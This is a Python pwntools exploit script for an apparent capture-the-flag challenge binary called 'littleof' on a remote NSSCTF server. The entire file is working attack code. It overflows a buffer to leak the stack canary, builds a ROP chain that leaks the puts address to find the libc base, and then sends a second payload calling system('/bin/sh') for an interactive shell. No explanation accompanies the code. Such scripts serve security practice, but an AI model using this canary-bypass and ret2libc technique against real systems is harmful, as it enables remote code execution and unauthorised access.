from pwn import *
from LibcSearcher import *

# p = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# p = remote("node4.buuoj.cn", 28576)
p = remote("node4.anna.nssctf.cn", 28080)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./nss/littleof')

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sal(a, b):
    p.sendlineafter(a, b)
def r(a):
    return p.recv(a)
def ru(a):
    p.recvuntil(a)
def rl():
    p.recvline()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return p.interactive()

context(os='linux', arch = 'amd64')
# context(os='linux', arch = 'amd64', log_level = "debug")

puts_plt =  0x4005b0
puts_got =  0x601018
setvbuf_plt =  0x4005f0
setvbuf_got =  0x601038
read_plt =  0x4005e0
read_got =  0x601030

ret = 0x000000000040059e
pop_rdi = 0x0000000000400863
vuln = 0x004006E2

padding = 0x50 - 8


payload = b'a'*0x49
ru('overflow?')
p.send(payload)
p.recvuntil(b'a'*0x49)
canary = u64(p.recv(7).rjust(8, b'\x00'))
print("canary = ", hex(canary))


# payload2 = (b'a' * padding + p64(canary)*2 + p64(pop_rdi)
#             + p64(puts_got) + p64(puts_plt) + p64(vuln))
payload2 = b'a'*0x48 + p64(canary) + b'a'*8 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x4006e2)

# ru("Try harder!")
sl(payload2)
print("ok")
# print(rl())

puts_addr = get_addr()
print("puts_addr = ", hex(puts_addr))

libc_base = puts_addr - 0x80aa0
binsh = libc_base + 0x1b3e1a
system = libc_base + 0x4f550


# leak canary
payload = b'a'*0x49
p.sendafter(b'overflow?', payload)
p.recvuntil(b'a'*0x49)
canary = u64(p.recv(7).rjust(8, b'\x00'))
print("canary = ", hex(canary))

# get shell
system = libc_base + 0x04f550
binsh = libc_base + 0x1b3e1a
payload = b'a'*0x48 + p64(canary) + b'a'*8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendafter(b'harder!', payload)
p.interactive()

inter()